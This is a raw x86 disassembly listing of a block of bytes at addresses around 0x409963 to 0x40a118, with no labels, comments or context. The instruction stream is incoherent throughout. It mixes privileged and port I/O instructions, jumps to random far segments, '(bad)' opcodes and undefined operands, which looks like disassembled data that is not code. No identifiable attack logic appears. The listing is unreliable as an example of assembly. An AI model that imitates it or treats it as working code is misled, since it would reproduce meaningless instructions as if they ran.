  409963:	adc    eax,0x14f7d837
  409968:	xchg   edx,eax
  409969:	and    eax,0x663664f8
  40996e:	fstp   DWORD PTR [edx]
  409970:	cwde   
  409971:	add    ch,BYTE PTR [eax+eiz*1]
  409974:	inc    ebp
  409975:	inc    edx
  409976:	jo     0x4099c8
  409978:	ret    0xef44
  40997b:	push   eax
  40997c:	inc    ecx
  40997d:	xlat   BYTE PTR ds:[ebx]
  40997e:	aaa    
  40997f:	and    al,0x80
  409981:	mov    ds:0x6aafd7dc,eax
  409986:	mov    WORD PTR [eax-0x23],gs
  409989:	cs adc dh,0x4
  40998d:	mov    WORD PTR [ebx],es
  40998f:	xchg   esp,eax
  409990:	loop   0x409969
  409992:	add    eax,0x243fdf1a
  409997:	aas    
  409998:	int3   
  409999:	or     ebx,edx
  40999b:	xor    DWORD PTR [edi-0x39],ebx
  40999e:	sub    ecx,esi
  4099a0:	fdiv   DWORD PTR [ebx+0x5758f7ef]
  4099a6:	(bad)  
  4099a8:	xor    eax,0xd994830c
  4099ad:	push   ss
  4099ae:	cmc    
  4099af:	and    BYTE PTR ds:0xd312b9c4,ch
  4099b5:	and    eax,0xae0ebf09
  4099ba:	inc    edx
  4099bb:	mov    ch,0x36
  4099bd:	cdq    
  4099be:	ret    
  4099bf:	cwde   
  4099c0:	in     al,0xac
  4099c2:	jb     0x4099bc
  4099c4:	and    esp,DWORD PTR [ecx]
  4099c6:	outs   dx,DWORD PTR ds:[esi]
  4099c7:	xor    DWORD PTR [esi+ebp*8-0xc877328],ebx
  4099ce:	sub    al,0x71
  4099d0:	or     DWORD PTR [edi-0x4bc4149e],ebp
  4099d6:	stc    
  4099d7:	or     DWORD PTR [esi-0x365cb273],ecx
  4099dd:	repz xchg bh,bh
  4099e0:	mov    WORD PTR [ecx+0x30],?
  4099e3:	cli    
  4099e4:	push   edi
  4099e5:	or     al,0x47
  4099e7:	popa   
  4099e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099e9:	xor    BYTE PTR [edx+0x2e],0xf4
  4099ed:	retf   0x3f2b
  4099f0:	cmp    bl,0xde
  4099f3:	xchg   ebx,eax
  4099f4:	or     dl,BYTE PTR [ebx]
  4099f6:	inc    edx
  4099f7:	push   ebx
  4099f8:	fild   QWORD PTR [esi+0x1d]
  4099fb:	sbb    DWORD PTR [ecx+esi*8+0x4a],0xffffffda
  409a00:	jge    0x409a4a
  409a02:	stc    
  409a03:	push   ss
  409a04:	in     al,0x7
  409a06:	jmp    0x12f:0x12be4797
  409a0d:	iret   
  409a0e:	test   BYTE PTR [edi+0x72],bl
  409a11:	cli    
  409a12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a13:	mov    ah,0x5f
  409a15:	jne    0x409a4a
  409a17:	pop    eax
  409a18:	push   ebx
  409a19:	les    eax,FWORD PTR [ecx]
  409a1b:	(bad)  
  409a1c:	xor    eax,0x1e357ad0
  409a21:	jb     0x409a3e
  409a23:	sub    ch,ah
  409a25:	ret    
  409a26:	shl    DWORD PTR [esp+eax*8-0x7c],0xab
  409a2b:	popa   
  409a2c:	inc    edx
  409a2d:	popf   
  409a2e:	fstp   QWORD PTR [ebx-0x25]
  409a31:	mov    bh,0x2e
  409a33:	xchg   ebx,eax
  409a34:	sub    BYTE PTR [edx-0x1a79f4a7],0xe9
  409a3b:	mov    bh,0x57
  409a3d:	js     0x409aa9
  409a3f:	inc    esi
  409a40:	mov    cl,0xa6
  409a42:	js     0x409a36
  409a44:	enter  0x9ef4,0xb5
  409a48:	outs   dx,BYTE PTR ds:[esi]
  409a49:	jmp    0x3605a981
  409a4e:	push   ecx
  409a4f:	clc    
  409a50:	inc    edi
  409a51:	pop    edx
  409a52:	push   ebx
  409a53:	jle    0x4099fb
  409a55:	ret    
  409a56:	jl     0x409a8a
  409a58:	nop
  409a59:	leave  
  409a5a:	jp     0x409a89
  409a5c:	mov    cl,0x58
  409a5e:	je     0x409a27
  409a60:	mov    bh,0x9
  409a62:	stos   DWORD PTR es:[edi],eax
  409a63:	and    BYTE PTR [ebx-0x1b000749],dl
  409a69:	int    0x51
  409a6b:	je     0x409a29
  409a6d:	mov    esp,edi
  409a6f:	jb     0x409a8d
  409a71:	adc    bh,cl
  409a73:	sbb    al,0x89
  409a75:	dec    edx
  409a76:	mov    DWORD PTR [eax],esi
  409a78:	inc    esp
  409a79:	dec    edx
  409a7a:	call   0x20681ecb
  409a7f:	fdivr  QWORD PTR [ebp-0x4f7395a6]
  409a85:	mov    eax,0xedc817fd
  409a8a:	push   ebp
  409a8b:	int    0x2f
  409a8d:	popa   
  409a8e:	lds    eax,FWORD PTR [ecx+edx*1-0x8]
  409a92:	jge    0x409acd
  409a94:	enter  0x1fab,0x73
  409a98:	repnz mov esp,0x475f902b
  409a9e:	shr    BYTE PTR [eax-0xa559bcf],cl
  409aa4:	add    eax,ebx
  409aa6:	in     eax,dx
  409aa7:	(bad)
  409aac:	or     al,0x63
  409aae:	neg    DWORD PTR [ebx+eiz*4]
  409ab1:	mov    ds:0xf5e65bd9,al
  409ab6:	les    ebp,FWORD PTR [ebx]
  409ab8:	add    dh,al
  409aba:	bound  eax,QWORD PTR [esi-0x8]
  409abd:	ds stc 
  409abf:	mov    esp,DWORD PTR [ebp-0x33]
  409ac2:	mov    ebp,DWORD PTR [edi]
  409ac4:	ins    BYTE PTR es:[edi],dx
  409ac5:	dec    edx
  409ac6:	or     DWORD PTR [ebx],ebx
  409ac8:	cli    
  409ac9:	jb     0x409a92
  409acb:	cmp    eax,0x2b54ba75
  409ad0:	dec    ebx
  409ad1:	dec    eax
  409ad2:	cmc    
  409ad3:	test   eax,0x91ac9bfe
  409ad8:	mov    edx,0xc565974
  409add:	adc    al,0xeb
  409adf:	inc    ecx
  409ae0:	ins    DWORD PTR es:[edi],dx
  409ae1:	push   esp
  409ae2:	add    al,0xf1
  409ae4:	sub    ch,BYTE PTR [edi-0x2d1d4a2f]
  409aea:	ror    BYTE PTR [ecx-0xa9c63d7],0x69
  409af1:	cs dec esp
  409af3:	inc    edx
  409af4:	int    0xe5
  409af6:	pop    edx
  409af7:	jmp    0x7d68e69a
  409afc:	in     eax,0xfc
  409afe:	push   edx
  409aff:	cmovno ecx,DWORD PTR [eax+0xa]
  409b03:	fdivrp st(0),st
  409b05:	fldenv [ebx+0x68]
  409b08:	jnp    0x409afa
  409b0a:	fdiv   st,st(4)
  409b0c:	cli    
  409b0d:	push   0xe876b590
  409b12:	sbb    BYTE PTR [ebp+edi*8-0x7d],0xb6
  409b17:	nop
  409b18:	cmp    al,0x98
  409b1a:	hlt    
  409b1b:	fdivr  st,st(4)
  409b1d:	xchg   ecx,eax
  409b1e:	or     DWORD PTR ds:0x92ebb35a,esp
  409b24:	jae    0x409b38
  409b26:	loop   0x409ab6
  409b28:	mov    DWORD PTR [eax],eax
  409b2a:	cmp    BYTE PTR [eax+0x101e6bcb],al
  409b30:	jae    0x409baa
  409b32:	mov    es,WORD PTR [ebp+0x37e974c6]
  409b38:	sbb    esp,DWORD PTR [edx]
  409b3a:	pop    es
  409b3b:	(bad)  
  409b3c:	fdiv   st,st(5)
  409b3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b3f:	call   0x3da9f888
  409b44:	push   0xfb1b1004
  409b49:	lock int3 
  409b4b:	inc    ebp
  409b4c:	push   0x8909237b
  409b51:	sti    
  409b52:	dec    edi
  409b53:	in     al,dx
  409b54:	pop    ds
  409b55:	mov    esp,0xdbf68d18
  409b5a:	cmc    
  409b5b:	scas   al,BYTE PTR es:[edi]
  409b5c:	xlat   BYTE PTR ds:[ebx]
  409b5d:	aam    0x34
  409b5f:	mov    BYTE PTR [edx-0x7a46d018],al
  409b65:	push   ebx
  409b66:	jns    0x409b99
  409b68:	pop    es
  409b69:	add    BYTE PTR [edi],bl
  409b6b:	sub    DWORD PTR [ebx+0x28],0x53
  409b6f:	and    al,0x5a
  409b71:	jl     0x409b75
  409b73:	mov    ds:0xbe2c0541,al
  409b78:	fld    QWORD PTR [ecx]
  409b7a:	xor    al,0x8
  409b7c:	inc    ebx
  409b7d:	dec    ebp
  409b7e:	jne    0x409b72
  409b80:	pop    edx
  409b81:	es call 0xeb956917
  409b87:	ret    
  409b88:	ins    DWORD PTR es:[edi],dx
  409b89:	push   es
  409b8a:	mov    WORD PTR [edi+0x39],fs
  409b8d:	out    0xd7,eax
  409b8f:	jne    0x409b71
  409b91:	les    ecx,FWORD PTR [esi]
  409b93:	xlat   BYTE PTR ds:[ebx]
  409b94:	pop    esi
  409b95:	ja     0x409b46
  409b97:	outs   dx,DWORD PTR ds:[esi]
  409b98:	push   esi
  409b99:	adc    al,0xde
  409b9b:	pusha  
  409b9c:	fild   WORD PTR [ebx+0x7d07926d]
  409ba2:	mov    esi,0xfcc1f9b2
  409ba7:	add    ecx,DWORD PTR [ecx+0x53908c99]
  409bad:	pushf  
  409bae:	stos   DWORD PTR es:[edi],eax
  409baf:	xchg   BYTE PTR [edx-0x4c709ef4],al
  409bb5:	mov    fs,WORD PTR [ecx]
  409bb7:	sub    eax,0x57dd5db8
  409bbc:	inc    esp
  409bbd:	lea    ebp,[ebx+eiz*2-0x43]
  409bc1:	mov    al,0x6f
  409bc3:	jecxz  0x409bdf
  409bc5:	sahf   
  409bc6:	shl    DWORD PTR [ecx-0x43],1
  409bc9:	sub    BYTE PTR [edi],bl
  409bcb:	cmp    al,0x20
  409bcd:	inc    edx
  409bce:	dec    ecx
  409bcf:	ret    
  409bd0:	jb     0x409bbe
  409bd2:	dec    esi
  409bd3:	popf   
  409bd4:	pop    edi
  409bd5:	or     cl,BYTE PTR ds:0x7c940147
  409bdb:	loope  0x409b82
  409bdd:	dec    edx
  409bde:	lds    esi,FWORD PTR [esi-0x10]
  409be1:	cmp    eax,0xdcf149ee
  409be6:	jae    0x409c62
  409be8:	fldz   
  409bea:	shl    DWORD PTR [ecx-0x14],cl
  409bed:	mov    bl,0x68
  409bef:	iret   
  409bf0:	repnz mov ds:0xd4590d1f,eax
  409bf6:	mov    ds:0x53f2193b,eax
  409bfb:	pop    edx
  409bfc:	and    DWORD PTR [edx+edx*2+0x4e],eax
  409c00:	call   FWORD PTR [edi-0x43213ad4]
  409c06:	xchg   ebp,eax
  409c07:	outs   dx,BYTE PTR ds:[esi]
  409c08:	mov    edi,0xc6c337a7
  409c0d:	es pushf 
  409c0f:	jno    0x409c38
  409c11:	jg     0x409ba8
  409c13:	sbb    ax,0x9cf9
  409c17:	push   0xffffff8e
  409c19:	push   eax
  409c1a:	aam    0x91
  409c1c:	or     eax,eax
  409c1e:	add    ebx,0x26
  409c21:	cli    
  409c22:	cmp    edx,ebx
  409c24:	and    al,0x72
  409c26:	adc    DWORD PTR [edi+eax*4],eax
  409c29:	and    BYTE PTR ds:0xc0a15d3e,cl
  409c2f:	clc    
  409c30:	and    ebx,DWORD PTR es:[ebp+0x74]
  409c34:	adc    dl,BYTE PTR [edx+ebp*1+0x6e8a8118]
  409c3b:	repz (bad) 
  409c3d:	push   ebx
  409c3e:	pop    ebx
  409c3f:	pop    ss
  409c40:	scas   al,BYTE PTR es:[edi]
  409c41:	out    0xe0,eax
  409c43:	dec    esi
  409c44:	mov    bh,0x31
  409c46:	sub    ah,cl
  409c48:	pop    edi
  409c49:	dec    eax
  409c4a:	push   eax
  409c4b:	jae    0x409c56
  409c4d:	sub    dh,BYTE PTR [esi+0x0]
  409c50:	push   esp
  409c51:	out    0xc9,eax
  409c53:	push   es
  409c54:	dec    ebp
  409c55:	rol    BYTE PTR [eax+0x4a870e9f],1
  409c5b:	add    eax,0xe2a54946
  409c60:	or     bl,BYTE PTR [ebx-0x52]
  409c63:	mov    eax,0xefd34931
  409c68:	dec    ebp
  409c69:	cld    
  409c6a:	mov    ds:0xc9aa2173,eax
  409c6f:	push   edx
  409c70:	call   DWORD PTR [ecx+eiz*2+0x1188719c]
  409c77:	cmp    BYTE PTR [ecx],dh
  409c79:	enter  0x9cb4,0xe4
  409c7d:	xchg   ebp,ebp
  409c7f:	inc    edi
  409c80:	loopne 0x409c31
  409c82:	cmp    esp,esi
  409c84:	fisttp WORD PTR [ebp+0x532745d]
  409c8a:	push   es
  409c8b:	xchg   ecx,eax
  409c8c:	add    DWORD PTR [edi],esi
  409c8e:	gs mov esi,0x174e4963
  409c94:	lock push esp
  409c96:	sar    cl,0xd5
  409c99:	adc    eax,0x7a38035a
  409c9e:	dec    eax
  409c9f:	xchg   edi,eax
  409ca0:	cmp    esp,ebx
  409ca2:	push   ebx
  409ca3:	pop    esi
  409ca4:	and    eax,0x4ae17a65
  409ca9:	dec    ebp
  409caa:	or     ecx,DWORD PTR [eax-0x43]
  409cad:	jl     0x409cb2
  409caf:	fild   WORD PTR [ebx-0x155806ae]
  409cb5:	icebp  
  409cb6:	pop    ecx
  409cb7:	inc    eax
  409cb8:	lahf   
  409cb9:	and    ecx,DWORD PTR [esi+0x7c]
  409cbc:	mov    WORD PTR [edx],?
  409cbe:	jne    0x409d39
  409cc0:	into   
  409cc1:	loope  0x409c68
  409cc3:	and    bh,dh
  409cc5:	loopne 0x409c6b
  409cc7:	ins    DWORD PTR es:[edi],dx
  409cc8:	push   esp
  409cc9:	sahf   
  409cca:	xchg   esp,eax
  409ccb:	rol    DWORD PTR [ebx],1
  409ccd:	iret   
  409cce:	inc    ecx
  409ccf:	aaa    
  409cd0:	repnz test al,0x72
  409cd3:	cs mov edx,0x6533bab7
  409cd9:	lea    esp,[edi+edi*8]
  409cdc:	xor    DWORD PTR [ecx-0x5cf7ddcf],ecx
  409ce2:	mov    DWORD PTR [eax+0x7cc2e622],edi
  409ce8:	sti    
  409ce9:	enter  0x827a,0x21
  409ced:	jecxz  0x409d19
  409cef:	mov    DWORD PTR [ecx],esi
  409cf1:	pop    ebx
  409cf2:	or     al,0x52
  409cf4:	daa    
  409cf5:	or     BYTE PTR [edi+0x46],cl
  409cf8:	dec    esp
  409cf9:	shl    esi,cl
  409cfb:	xor    DWORD PTR [edx+ebp*1],ecx
  409cfe:	xor    DWORD PTR [eax+0x2e7cf509],ebp
  409d04:	shl    DWORD PTR [esi-0x3677d3e6],0xc2
  409d0b:	out    0x11,al
  409d0d:	mov    ebp,ebx
  409d0f:	push   DWORD PTR [ebx-0x7f]
  409d12:	mov    ds:0x36a9c48e,al
  409d17:	sub    al,0xe3
  409d19:	add    dh,BYTE PTR [edi+0x1751ec2]
  409d1f:	mov    edi,0xc2dd4ab8
  409d24:	sbb    edi,DWORD PTR [si+0x72e5]
  409d29:	cmp    DWORD PTR [esp+esi*4-0x5],esi
  409d2d:	into   
  409d2e:	mov    esp,0xcc11066a
  409d33:	jge    0x409ce8
  409d35:	mov    bh,0x49
  409d37:	jmp    0x905052e0
  409d3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d3d:	loope  0x409d20
  409d3f:	ja     0x409d2d
  409d41:	fidiv  DWORD PTR [eax+eax*2+0x120f8d3e]
  409d48:	push   ebx
  409d49:	(bad)  
  409d4a:	sbb    al,0x3
  409d4c:	rol    edi,0x76
  409d4f:	mov    ebp,0xbc6a4124
  409d54:	scas   eax,DWORD PTR es:[edi]
  409d55:	jmp    0x426c4fa0
  409d5a:	jge    0x409cf0
  409d5c:	and    DWORD PTR [esi],0xfffffffb
  409d5f:	stos   BYTE PTR es:[edi],al
  409d60:	(bad)  
  409d61:	mov    ebx,0xa8c1103
  409d66:	mov    cs,WORD PTR [eax-0x6c3e641f]
  409d6c:	daa    
  409d6d:	icebp  
  409d6e:	sub    edx,edi
  409d70:	cmp    DWORD PTR [edx+0x3037a4b8],esi
  409d76:	ret    0xf1e8
  409d79:	cld    
  409d7a:	rcr    BYTE PTR [esi],cl
  409d7c:	and    eax,0x1d881e1d
  409d81:	std    
  409d82:	inc    esp
  409d83:	sub    BYTE PTR [eax],dh
  409d85:	mov    esp,0xf966f782
  409d8a:	push   es
  409d8b:	xchg   ebx,eax
  409d8c:	aas    
  409d8d:	fadd   st,st(3)
  409d8f:	(bad)  
  409d90:	test   al,0xa6
  409d92:	into   
  409d93:	clc    
  409d94:	and    DWORD PTR ds:0xce04c8b9,ebp
  409d9a:	imul   DWORD PTR [esi]
  409d9c:	cld    
  409d9d:	repz xor ch,BYTE PTR [edx]
  409da0:	push   esp
  409da1:	popa   
  409da2:	stos   BYTE PTR es:[edi],al
  409da3:	xor    eax,0xa7def8e9
  409da8:	inc    ebx
  409da9:	adc    eax,0xaef3a48
  409dae:	mov    eax,0x55214677
  409db3:	outs   dx,DWORD PTR ds:[esi]
  409db4:	sbb    eax,0x46f4d2ce
  409db9:	dec    ebp
  409dba:	mov    ebp,DWORD PTR [ecx+0x65cbbd55]
  409dc0:	in     eax,dx
  409dc1:	fist   WORD PTR [edi-0x3a]
  409dc4:	ss stc 
  409dc6:	dec    esi
  409dc7:	repnz bound edi,QWORD PTR [esi+eax*8]
  409dcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dcc:	daa    
  409dcd:	sub    eax,0x75c77dfe
  409dd2:	fild   WORD PTR fs:[edx]
  409dd5:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  409dd7:	fs jmp 0x44012198
  409ddd:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ddf:	aad    0xaf
  409de1:	xor    DWORD PTR [ebp-0x2d],ebp
  409de4:	mov    dl,0x12
  409de6:	jmp    0x1d50810b
  409deb:	or     ch,bh
  409ded:	sbb    eax,0x2ee17964
  409df2:	lods   eax,DWORD PTR ds:[esi]
  409df3:	mov    bh,0x25
  409df5:	mov    dh,0xb9
  409df7:	pop    ds
  409df8:	adc    al,0x14
  409dfa:	scas   eax,DWORD PTR es:[edi]
  409dfb:	sti    
  409dfc:	les    ebx,FWORD PTR [eax+0x64]
  409dff:	mov    ds:0x4e03e3d,eax
  409e04:	test   esp,0x15c1925e
  409e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e0b:	stos   BYTE PTR es:[edi],al
  409e0c:	call   0x242b9c56
  409e11:	sbb    eax,DWORD PTR [edi+0x75c34f48]
  409e17:	push   eax
  409e18:	mov    esp,0x8e9e1ceb
  409e1d:	cmp    ch,dl
  409e1f:	fmul   QWORD PTR [eax-0xb55015a]
  409e25:	stos   DWORD PTR es:[edi],eax
  409e26:	xchg   ebx,eax
  409e27:	lds    ecx,FWORD PTR [edx+0x6d9ace90]
  409e2d:	(bad)  
  409e2e:	adc    DWORD PTR [eax+0x29],eax
  409e31:	test   DWORD PTR [ecx+0x256eacac],edi
  409e37:	push   0xffffff96
  409e39:	loope  0x409dbf
  409e3b:	addr16 jo 0x409e97
  409e3e:	lods   eax,DWORD PTR ds:[esi]
  409e3f:	lds    ebx,FWORD PTR [edi-0x1e]
  409e42:	mov    ebx,0x7d539d48
  409e47:	cdq    
  409e48:	xchg   ecx,eax
  409e49:	jae    0x409e4b
  409e4b:	mov    edx,0x1a6026a5
  409e50:	push   edx
  409e51:	adc    edi,0xaadbaf53
  409e57:	or     DWORD PTR [edi],eax
  409e59:	ja     0x409e87
  409e5b:	dec    ebx
  409e5c:	loopne 0x409df6
  409e5e:	xchg   ebp,eax
  409e5f:	mov    bh,0x24
  409e61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e62:	jecxz  0x409e04
  409e64:	loope  0x409ecc
  409e66:	dec    eax
  409e67:	stc    
  409e68:	and    DWORD PTR [edi+0x20],ecx
  409e6b:	(bad)  
  409e6c:	xor    bh,ch
  409e6e:	loop   0x409e7c
  409e70:	test   eax,0xa185802b
  409e75:	push   edi
  409e76:	fucompp 
  409e78:	sbb    BYTE PTR [ebp+0x77a6dbdd],bh
  409e7e:	xchg   esp,eax
  409e7f:	je     0x409e78
  409e81:	icebp  
  409e82:	outs   dx,DWORD PTR ds:[esi]
  409e83:	lods   eax,DWORD PTR ds:[esi]
  409e84:	leave  
  409e85:	lea    ebp,[edi-0x7f]
  409e88:	mov    bl,0xb9
  409e8a:	mov    edi,gs
  409e8c:	fcomp  QWORD PTR ds:0x6cf64cb7
  409e92:	sub    al,0xe
  409e94:	xchg   esi,eax
  409e95:	mov    cl,dh
  409e97:	popf   
  409e98:	lock add DWORD PTR [ebx+0x25],ecx
  409e9c:	jmp    0x409ea0
  409e9e:	push   ebp
  409e9f:	(bad)  
  409ea0:	or     eax,0xf5c3a53a
  409ea5:	mov    edx,0x28f026cc
  409eaa:	or     DWORD PTR [edx-0x71d4ff56],esp
  409eb0:	cmp    dh,BYTE PTR [edi-0x5a7a7190]
  409eb6:	pusha  
  409eb7:	ror    BYTE PTR [esi],1
  409eb9:	leave  
  409eba:	push   esi
  409ebb:	push   edx
  409ebc:	or     edi,eax
  409ebe:	pop    eax
  409ebf:	fstp   TBYTE PTR [ecx]
  409ec1:	sahf   
  409ec2:	int3   
  409ec3:	pop    ss
  409ec4:	ret    
  409ec5:	mulps  xmm3,XMMWORD PTR [ecx]
  409ec8:	and    eax,0x903002b1
  409ecd:	sub    al,0x25
  409ecf:	aas    
  409ed0:	mov    ah,0xf2
  409ed2:	xchg   ecx,eax
  409ed3:	mov    ah,0xf6
  409ed5:	mov    bh,0xd3
  409ed7:	mov    dh,0xe3
  409ed9:	stos   DWORD PTR es:[edi],eax
  409eda:	pusha  
  409edb:	xor    al,bh
  409edd:	push   es
  409ede:	dec    eax
  409edf:	fst    QWORD PTR [esi+eiz*2+0x71]
  409ee3:	(bad)  
  409ee4:	sahf   
  409ee5:	cmp    DWORD PTR [ebx-0x74],eax
  409ee8:	mov    ch,0x54
  409eea:	add    BYTE PTR [edi+eax*2+0x251e41d0],ch
  409ef1:	loop   0x409f0a
  409ef3:	aas    
  409ef4:	push   edi
  409ef5:	adc    esi,DWORD PTR [esi]
  409ef7:	mov    al,ds:0x918fd9b3
  409efc:	and    eax,0xfaf4fb1b
  409f01:	mov    eax,0xa2075893
  409f06:	xor    eax,0xd666a689
  409f0b:	call   0xeeac:0xff046135
  409f12:	test   eax,0xba5f2a1b
  409f17:	mov    edi,DWORD PTR ds:0x25f115fe
  409f1d:	popa   
  409f1e:	add    al,0x89
  409f20:	push   0x246ef577
  409f25:	frstor [ebx-0x12f797cf]
  409f2b:	inc    esp
  409f2c:	sbb    esp,DWORD PTR ds:0xdbecdd41
  409f32:	mov    ebp,0x17adc7a2
  409f37:	adc    al,0xf8
  409f39:	mov    al,ds:0xf55583c7
  409f3e:	int    0xcd
  409f40:	lds    esp,FWORD PTR [eax]
  409f42:	xor    esi,DWORD PTR [edi-0x10]
  409f45:	add    edx,DWORD PTR [edx]
  409f47:	pop    esp
  409f48:	mov    bh,bl
  409f4a:	cld    
  409f4b:	xor    DWORD PTR [edx-0x49f906b],eax
  409f51:	(bad)  
  409f53:	daa    
  409f54:	fisttp DWORD PTR [eax]
  409f56:	in     eax,0x70
  409f58:	inc    DWORD PTR [edx+0x7a]
  409f5b:	rcr    DWORD PTR [esp+edi*1],1
  409f5e:	jb     0x409fa4
  409f60:	and    DWORD PTR [edi],edi
  409f62:	mov    WORD PTR [ebx-0x9],ss
  409f65:	cmp    al,0x12
  409f67:	sub    al,ah
  409f69:	jnp    0x409fb3
  409f6b:	dec    esi
  409f6c:	into   
  409f6d:	loop   0x409fcf
  409f6f:	gs add dl,bh
  409f72:	enter  0xdfc4,0x91
  409f76:	cpuid  
  409f78:	push   edi
  409f79:	jmp    0x520b:0xec991f6b
  409f80:	mov    ah,0x9
  409f82:	sbb    bl,0xa6
  409f85:	scas   al,BYTE PTR es:[edi]
  409f86:	mov    ebx,0x331489c6
  409f8b:	or     al,0x27
  409f8d:	sti    
  409f8e:	mov    edi,0x73c589b5
  409f93:	or     DWORD PTR [ecx-0x4cceb40b],ebx
  409f99:	adc    ah,dl
  409f9b:	adc    al,0x3
  409f9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f9e:	jecxz  0x409fab
  409fa0:	sub    eax,edx
  409fa2:	cmp    DWORD PTR [esi+ebp*8],ebp
  409fa5:	sub    DWORD PTR [esi-0x2b198e1e],esi
  409fab:	and    al,0x2
  409fad:	pop    ebp
  409fae:	cli    
  409faf:	mov    eax,ds:0x7fa08329
  409fb4:	push   ecx
  409fb5:	and    DWORD PTR [ecx+0x66],edi
  409fb8:	cmc    
  409fb9:	sbb    ch,BYTE PTR [edi]
  409fbb:	push   esp
  409fbc:	hlt    
  409fbd:	inc    ecx
  409fbe:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fc0:	inc    esi
  409fc1:	dec    edi
  409fc2:	xchg   ebx,eax
  409fc3:	repz or BYTE PTR [ebx+0x41a8f895],0xb2
  409fcb:	les    edi,FWORD PTR [eax]
  409fcd:	push   edi
  409fce:	bnd jmp 0x409ffd
  409fd1:	or     eax,0xccb621ab
  409fd6:	xchg   ebp,eax
  409fd7:	mov    edi,cs
  409fd9:	out    0xd7,eax
  409fdb:	and    ebp,edi
  409fdd:	sbb    al,0x16
  409fdf:	sub    bh,bl
  409fe1:	jl     0x40a02a
  409fe3:	add    eax,ecx
  409fe5:	push   es
  409fe6:	mov    ebx,0x103b7f79
  409feb:	and    al,0x91
  409fed:	pop    edi
  409fee:	cs out 0xe0,eax
  409ff1:	or     al,BYTE PTR ds:0xf7f4f098
  409ff7:	adc    DWORD PTR [ebx-0xb638937],ebx
  409ffd:	das    
  409ffe:	and    DWORD PTR [ebx+esi*4+0x7c],ebx
  40a002:	jmp    0x409feb
  40a004:	xor    ch,ch
  40a006:	pop    esp
  40a007:	faddp  st(4),st
  40a009:	xlat   BYTE PTR ds:[ebx]
  40a00a:	pop    esp
  40a00b:	fwait
  40a00c:	adc    DWORD PTR [ebx+0x11495efe],ebx
  40a012:	mul    DWORD PTR [ebx+0xca409e0]
  40a018:	sbb    edi,ecx
  40a01a:	test   DWORD PTR [ebx+ebx*4-0x80],ebp
  40a01e:	inc    edx
  40a01f:	pop    es
  40a020:	outs   dx,BYTE PTR ds:[esi]
  40a021:	jb     0x40a088
  40a023:	imul   eax,eax,0xd14531f7
  40a029:	lds    esp,FWORD PTR [edx+0x38]
  40a02c:	sub    eax,DWORD PTR [ecx+ebx*2-0x1192f366]
  40a033:	push   cs
  40a034:	int    0x5c
  40a036:	and    ebp,DWORD PTR [edx-0x4b88a650]
  40a03c:	cmp    edi,DWORD PTR [ecx-0x5cfc872a]
  40a042:	icebp  
  40a043:	dec    esi
  40a044:	pop    edx
  40a045:	sub    ebx,ebp
  40a047:	(bad)  
  40a048:	out    dx,eax
  40a049:	cwde   
  40a04a:	xchg   ebp,eax
  40a04b:	icebp  
  40a04c:	sub    eax,0x4e699c42
  40a051:	ja     0x40a0be
  40a053:	mov    ecx,0x46a2557d
  40a058:	leave  
  40a059:	pop    ds
  40a05a:	sbb    al,0x63
  40a05c:	or     DWORD PTR [edx],ebx
  40a05e:	jg     0x40a014
  40a060:	xor    al,BYTE PTR [edx+0x367b098d]
  40a066:	xor    dh,BYTE PTR [eax-0x3969eac3]
  40a06c:	call   0x1765:0x3ae7c06a
  40a073:	fcmovnb st,st(7)
  40a075:	push   0xffffff8c
  40a077:	adc    ch,BYTE PTR [esi+0x5d926c57]
  40a07d:	jmp    0x40a099
  40a07f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a080:	mov    esi,0x60b17966
  40a085:	enter  0x12a2,0xae
  40a089:	int    0xdc
  40a08b:	loope  0x40a0ee
  40a08d:	addr16 sub al,0xcb
  40a090:	(bad)  
  40a091:	pop    ebp
  40a092:	sub    ch,bl
  40a094:	rep stos DWORD PTR es:[edi],eax
  40a096:	sub    eax,0x6841cef8
  40a09b:	pop    ebp
  40a09c:	dec    edi
  40a09d:	daa    
  40a09e:	pop    es
  40a09f:	or     ecx,DWORD PTR [edx+0x61089c63]
  40a0a5:	in     al,0x14
  40a0a7:	push   edi
  40a0a8:	lods   al,BYTE PTR ds:[esi]
  40a0a9:	call   0xe171:0x6abe4f2b
  40a0b0:	(bad)  
  40a0b2:	mov    bh,0x28
  40a0b4:	inc    edx
  40a0b5:	nop
  40a0b6:	and    BYTE PTR [edi+ecx*4+0x2670559e],dh
  40a0bd:	mov    esp,edx
  40a0bf:	mov    ebp,0xc2b82b09
  40a0c4:	ss out 0x8b,al
  40a0c7:	push   edi
  40a0c8:	push   eax
  40a0c9:	cmc    
  40a0ca:	sahf   
  40a0cb:	fsub   st,st(5)
  40a0cd:	mov    ch,0xf1
  40a0cf:	pop    ecx
  40a0d0:	ins    DWORD PTR es:[edi],dx
  40a0d1:	std    
  40a0d2:	test   cl,dl
  40a0d4:	dec    ebp
  40a0d5:	mov    esi,0x88ff8ee0
  40a0da:	adc    al,0x8e
  40a0dc:	add    edi,DWORD PTR [esi]
  40a0de:	sbb    ah,cl
  40a0e0:	mov    eax,cs
  40a0e2:	jns    0x40a0b6
  40a0e4:	push   ecx
  40a0e5:	fld    st(1)
  40a0e7:	enter  0x3795,0x81
  40a0eb:	call   0x927b155e
  40a0f0:	dec    ebx
  40a0f1:	nop
  40a0f2:	cmp    al,BYTE PTR [eax+0x787d7e66]
  40a0f8:	popf   
  40a0f9:	or     eax,DWORD PTR [ebx-0x675ed1e8]
  40a0ff:	outs   dx,BYTE PTR ds:[esi]
  40a100:	and    DWORD PTR [ecx-0x56],eax
  40a103:	arpl   WORD PTR [edi+0x6ae74634],cx
  40a109:	rcl    eax,1
  40a10b:	push   0x1e
  40a10d:	or     esi,eax
  40a10f:	int    0x39
  40a111:	push   es
  40a112:	xchg   esi,eax
  40a113:	or     al,0x73
  40a115:	in     al,dx
  40a116:	loope  0x40a0cb
  40a118:	xchg   ecx,eax
